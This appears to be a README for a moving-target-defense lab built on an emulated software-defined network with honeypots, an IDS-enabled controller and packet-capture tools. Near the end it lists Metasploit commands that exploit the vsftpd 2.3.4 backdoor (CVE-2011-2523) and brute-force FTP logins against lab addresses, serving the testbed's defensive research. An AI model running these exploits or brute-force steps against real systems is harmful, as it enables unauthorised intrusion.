# MTD-with-SDN
Enable 802.1q  module and ipv4 forwarding on the host
>sysctl -w net.ipv4.ip_forward=1
>
>sudo apt install vlan
>
>modprobe --first-time 8021q

 
Build all the containers with
>sh build_all.sh

Important: create dionaea's folder structures es: honeypots/logs/dionaea/data/[ftp|http|tftp]/root

To pull the container for `containernet` launch
f
>docker pull containernet/containernet

From the project root folder to run the container
>docker run --name containernet -e VM_PATH=$PWD -it --rm --privileged --pid='host' -v /var/run/docker.sock:/var/run/docker.sock -v ./containernet:/containernet/mtd  containernet/containernet /bin/bash

The SDN Python creation files are in the `containernet` folder. Run them using `python3`
Once done, you can run any command on the containers by appending it to the host name. Ex.: `d1 top`.

After creating the network start the controller in a new terminal using

>docker exec -it mn.c0_docker ryu-manager simple_switch_snort.py

To reboot the frr service on a router

>service frr restart

To install Edgeshark requirements

>TEMP_DEB="$(mktemp)" &&
>wget -O "$TEMP_DEB" 'https://github.com/siemens/cshargextcap/releases/download/v0.10.7/cshargextcap_0.10.7_linux_amd64.deb' &&
>sudo dpkg -i "$TEMP_DEB" &&
>rm -f "$TEMP_DEB"

To launch Edgeshark

>wget -q --no-cache -O -   https://github.com/siemens/edgeshark/raw/main/deployments/wget/docker-compose.yaml   | docker compose -f - up

To abuse CVE-2011-2523 on FTP server:

>atk ./msfconsole

>use exploit/unix/ftp/vsftpd_234_backdoor

>set LHOST 10.1.0.2

>set RHOST 10.0.1.2

> run

To run a bruteforce on FTP server:

>use auxiliary/scanner/ftp/ftp_login

>set RHOST 10.0.1.2

>set USERPASS_FILE /bruteforce/userpass.txt

>run

To list active rules on OpenVSwitch
> sh ovs-ofctl dump-flows s1

To kill and remove all containers

>docker ps -aq | xargs docker stop | xargs docker rm
